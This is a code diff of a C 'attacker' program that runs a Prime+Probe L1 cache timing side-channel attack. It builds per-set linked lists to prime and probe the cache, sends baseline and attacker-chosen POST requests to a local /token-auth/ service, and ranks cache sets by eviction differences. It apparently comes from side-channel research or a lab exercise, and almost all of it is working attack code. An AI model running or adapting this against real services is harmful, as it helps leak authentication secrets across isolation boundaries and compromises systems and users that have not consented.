@@ -2,7 +2,8 @@
 #include <stdint.h>
 
 #include <x86intrin.h>
-#include <curl/curl.h>
+
+#include <fcntl.h>
 
 #include "attacker.h"
 
@@ -21,22 +22,33 @@
 
 
 // prime+probe
-#define TRAINING_REPS 10
 #define ATTACK_RUNS 10000
-#define BASELINE_RUNS 10000
-#define EVICTION_THRESHOLD 0
+#define EVICTION_THRESHOLD 400
 
 // socket
 #define PORT 8080
 #define INET "127.0.0.1"
+#define TWO_MB (L1_SIZE * 64)
 
+// sets up linked list for priming and probing based off of addresses in probe array
+typedef struct node {
+    struct node *next;
+    uint8_t padding[LINE_SIZE - sizeof(struct node*)]; // make 1 node = LINE_SIZE (64 bytes)
+} node_t;
 
-uint8_t probe_array[L1_SIZE] __attribute__((aligned(4096))); // allocates int array of size = L1_SIZE and aligns to page
-//CURL *curl_handle;
+node_t *set_pointers[64]; // stores head pointers for each set linked list
+
+uint8_t probe_array[TWO_MB] __attribute__((aligned(4096))); // allocates int array of size = L1_SIZE and aligns to page
+
 uint64_t c_threshold;
 int shuffle_arr[SETS];
 
+int baseline[SETS] = {0}; 
+int count[SETS]= {0}; // records sets that have been touched
 
+char buf[1024]= {0};
+
+uint64_t c_threshold;
 
 int main(int argc, char* argv[]) {
      // setup socket connection 
@@ -51,102 +63,99 @@ int main(int argc, char* argv[]) {
     }
     shuffle(shuffle_arr);
 
-
+    // set up linked list
+    linked_list();
 
     //cache_threshold();
     printf("Probe array base address: %p\n", (void*)probe_array);
 
 
     // find threshold
-    c_threshold = 95;//cache_threshold(); // or set ~100
+    c_threshold = EVICTION_THRESHOLD;
 
-    // prep attack and training data for request
-    char *valid_data = 
-    "POST /token-auth/ HTTP/1.1\r\n"
-    "Host: 127.0.0.1\r\n"
-    "Content-Length: 37\r\n"
-    "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Connection: keep-alive\r\n"
-    "\r\n"
-    "username=user1&password=password&id=0000";
     char *baseline_data = 
     "POST /token-auth/ HTTP/1.1\r\n"
     "Host: 127.0.0.1\r\n"
-    "Content-Length: 37\r\n"
+    "Content-Length: 35\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
     "Connection: keep-alive\r\n"
     "\r\n"
-    "username=user1&password=password&id=4100";
+    "username=none&password=none&id=4132";
     char attack_data[256];
     get_inputs(attack_data, argc, argv);
     
-    char buf[1024];
-    int baseline[SETS] = {0}; 
-    int count[SETS] = {0}; // records sets that have been touched
-
     // get page table entries in cache lookup
     for (int i = 0; i < SETS; i++) {
         for (int w = 0; w < WAYS; w++) {
             volatile uint8_t *addr = &probe_array[(w * 4096) + (i * 64)];
-            uint8_t dummy = *addr; 
+            volatile uint8_t dummy = *addr; 
         }
     }
     _mm_mfence();
   
     for (int j = 0; j < ATTACK_RUNS; j++) {
-       
 
-        // Train BP
-        for(int i = 0; i < TRAINING_REPS; i++){
-            make_request(valid_data, &clientfd);
+        //PRIME
+        prime_cache();
+
+        // BASELINE
+        send(clientfd, baseline_data, strlen(baseline_data), 0);
+        int n = -1;
+        while (n < 0) {
+            n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
         }
 
-        //prime
-        for (unsigned int i = 0; i < SETS; i++){
-            for(unsigned int w = 0; w < WAYS; w++){
-                volatile uint8_t tmp = probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)];
-            }
-        }
-        _mm_mfence();
-
-        // send baseline
-        send(clientfd, baseline_data, strlen(attack_data), 0);
-        for (volatile int i = 0; i < 150; i++);
-        //probe
+        //PROBE
         check_cache_presence(baseline);
-        //recv
-        recv(clientfd, buf, sizeof(buf), 0);
 
+        while (n > 0) {
+            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket buf
+        }
 
         // = ATTACK =
-        // Train BP
-        for(int i = 0; i < TRAINING_REPS; i++){
-            make_request(valid_data, &clientfd);
-        }
+        //PRIME
+        prime_cache();
 
-        //prime
-        for (unsigned int i = 0; i < SETS; i++){
-            for(unsigned int w = 0; w < WAYS; w++){
-                volatile uint8_t tmp = probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)];
-            }
-        }
-        _mm_mfence();
-
-        // send attack
+        // ATTACK
         send(clientfd, attack_data, strlen(attack_data), 0);
-        for (volatile int i = 0; i < 150; i++);
-        //probe
-        check_cache_presence(count);
         
-        recv(clientfd, buf, sizeof(buf), 0);
+        n = -1;
+        while (n < 0) {
+            n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
+        }
+
+        //PROBE
+        check_cache_presence(count);
+
+        while (n > 0) {
+            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket
+        }
     } 
 
     printf("\n===== Eviction Difs =====\n");
+    int max = 0;
+    int mset = -1;
     for (int i = 0; i < SETS; i++) { 
         int diff = count[i] - baseline[i];
-        printf("Set %d: %d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
+        //float prcnt = ((float)diff/baseline[i]) * 100;
+        if (diff > max){
+            max = diff;
+            mset = i;
+        }
+        if (diff > 0){
+            printf("Set %d: %d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
+        }
     }
-    //curl_easy_cleanup(curl_handle);
+    int diff_sum = 0;
+    for (int i = 0; i < SETS; i++) {
+        if (i != mset){
+            diff_sum+=count[i] - baseline[i];
+        }
+    } 
+    float avg_diff = (float)diff_sum/63.0; // calculates avg diff to see if run was noisy (excludes highest)
+    printf("Average diff: %0.1f\n", avg_diff);
+    printf("HIGHEST SET: %d (%d)\n", mset, max);
+
     close(clientfd);
     return 0;
 
@@ -166,83 +175,85 @@ void prime_cache(){
     // Prime L1 cache
     // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
     for (unsigned int i = 0; i < SETS; i++){
-        for(unsigned int w = 0; w < WAYS; w++){ // primes each way
-            volatile uint8_t tmp; 
-            tmp =  probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)]; // forces load
+        node_t *current = set_pointers[i];
+        while (current != NULL){
+            current = current->next;
         }
     }
-    
+    _mm_mfence();
 }
 
+
+
+
+void linked_list(){
+    node_t *sets_collection[64][10]; // will store addresses associated with set - to be later linked 
+
+    for (int i = 0; i < (LINE_SIZE * SETS * 10); i += LINE_SIZE){ // iterates 10 pages (10 addresses per set)
+        //get the set
+        intptr_t address = (intptr_t)&probe_array[i];
+        int set = (address >> 6) & 0x3F;
+
+        // store address under related set
+        sets_collection[set][(i/(LINE_SIZE * SETS))] = (node_t*) address;
+    }
+
+    // shuffle the addresses under each set - tricks prefetcher
+    for (int set = 0; set < SETS; set++){
+
+        // shuffle each item (address pointer)
+        for(int item = 0; item < 10; item++){
+            node_t *tmp = sets_collection[set][item];
+            int shuffle_index = rand() % 10;
+            // swap
+            sets_collection[set][item] = sets_collection[set][shuffle_index];
+            sets_collection[set][shuffle_index] = tmp;
+        }
+
+        //link togther and create the liked list
+        int i = 1;
+        set_pointers[set] = sets_collection[set][0];
+        node_t *current = set_pointers[set];
+
+        while(i < 10){
+            current->next = sets_collection[set][i];
+            current = current->next;
+            i++;
+        }
+        current->next = NULL; // last node points to NULL
+    }
+}
 
 void check_cache_presence(int *count){
     uint64_t t1, t2;
     unsigned int pid;
-    volatile uint8_t junk = 0;
+
     for (unsigned int i = 0; i < SETS; i++){
+    
         int set = shuffle_arr[i]; // determine random set to probe
-        int wayEvictions = 0;
-        //for (int w = 0; w < WAYS; w ++){
-            //uint8_t *addr = &probe_array[(set * LINE_SIZE) + (w * 4096)];
-            _mm_lfence();
+        node_t *current = set_pointers[set];
+        //int e = 0;
+        //while(current != NULL){
+            _mm_mfence();
             t1 = __rdtscp(&pid); 
             _mm_lfence();
 
-            for (int w = 0; w < 4; w++) {
-                junk ^= probe_array[(w * 4096) + (set * 64) + (junk & 0)];
+            // loop through all set pointer addresses
+            while (current != NULL){
+                current = current->next;
             }
+
             _mm_lfence();
             t2 = __rdtscp(&pid);
             _mm_lfence();
-                
-            if (t2 - t1 > c_threshold){ // if way evicted count one set eviction and move onto next set
-                count[set] ++;
-                //wayEvictions +=1;    
-                //break;
 
+            if (t2 - t1 > c_threshold){ // if miss detected
+                count[set]++;
             }
-        
-        // if (wayEvictions == 1){
-        //     count[set] ++;
-        // }
-        
+        //}
     }
     
     // printf("%d/%d cache hits\n", present, NO_LINES);
-}
-
-
-void primeprobe(char *data, int *clientfd, int *results) {
-    prime_cache(); // prime L1 with probe array
-    _mm_mfence(); // wait for prime to compelte before sending bad request
-
-    send(*clientfd, data, strlen(data), 0);
-    for (volatile int i = 0; i < 100; i++); 
-    
-    _mm_lfence();
-    check_cache_presence(results);
-
-    char buf[1024];
-    recv(*clientfd, buf, sizeof(buf), 0); 
-    _mm_mfence();
-    
-}
-// send request with curl request for token to microservice
-void make_request(char *data, int *clientfd){
-    // curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
-    // curl_easy_perform(curl_handle); 
-    send(*clientfd, data, strlen(data), 0);
-    char buf[256];
-    recv(*clientfd, buf, 256, 0);
-    _mm_lfence();
-}
-
-// returns junk so that curl doesnt write to console
-size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
-{
-    (void)buffer;
-    (void)userp;
-    return size * nmemb;
 }
 
 
@@ -253,7 +264,7 @@ void get_inputs(char attack_data[], int argc, char* argv[]){
         attack_id = argv[1]; 
     }
     char body[128];
-    int body_len = snprintf(body, sizeof(body), "username=user1&password=password&id=%s", attack_id);
+    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);
 
     snprintf(attack_data, 512, 
         "POST /token-auth/ HTTP/1.1\r\n"
@@ -268,62 +279,11 @@ void open_socket(int *clientfd, struct sockaddr_in *servaddr){
     
     *clientfd = socket(AF_INET, SOCK_STREAM, 0);
 
+    int flags = fcntl(*clientfd, F_GETFL, 0);
+    fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);
+
     servaddr->sin_family = AF_INET;
     servaddr->sin_port = htons(PORT);
     servaddr->sin_addr.s_addr = inet_addr(INET);
 }
 
-
-
-// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
-volatile int test_data = 2;
-int cache_threshold(){
-    uint64_t t1, t2, time; 
-    uint64_t min = UINT64_MAX;
-    uint64_t max = 0;
-    unsigned int pid;
-
-    for (int i = 0; i < 1000; i++){
-        pid = test_data;
-        pid = test_data;
-
-        _mm_lfence();
-        t1 = __rdtscp(&pid);
-        _mm_lfence();
-
-        pid = test_data;
-
-        _mm_lfence();
-        t2 = __rdtscp(&pid);
-        _mm_lfence();
-
-        time = t2 - t1;
-        if (time > max){
-            max = time;
-        }
-    }
-
-
-    for (int i = 0; i < 1000; i++){
-        _mm_clflush((void*)&test_data);
-        _mm_mfence();
-
-        _mm_mfence();
-        t1 = __rdtscp(&pid);
-        _mm_mfence();
-
-        pid = test_data;
-
-        t2 = __rdtscp(&pid);
-        _mm_mfence();
-
-        time = t2 - t1;
-        if (min > time){
-            min = time;
-        }
-    }
-    
-    uint64_t threshold = (min + max)/2;
-    printf("fastest miss: %ld\nslowest hit: %ld\n threshold: %ld", min, max, threshold);
-    return threshold;
-}
